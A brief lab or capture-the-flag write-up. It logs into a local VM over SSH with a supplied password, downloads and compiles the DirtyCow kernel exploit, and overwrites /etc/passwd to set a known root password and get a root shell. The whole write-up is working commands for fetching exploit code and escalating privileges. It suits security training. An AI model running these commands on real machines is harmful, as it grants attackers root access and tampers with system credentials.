# writeup4

Connect with zaz:\
*reminder password: 646da671ca01bb5d84dbb5fb2238dc8e*
```
$ ssh zaz@192.168.56.102
```

## Another DirtyCow
```
$ cd /tmp
$ curl https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c --output cow.c
$ gcc -pthread cow.c -o cow
```
This program can modify a file, so we try to modify the file `/etc/passwd` to change the root password.\
password : `p`
```
$ ./cow /etc/passwd "root:fil.mzz26AR.E:0:0:pwned:/root:/bin/bash"
$ su root
$ whoami
root
```

The end !
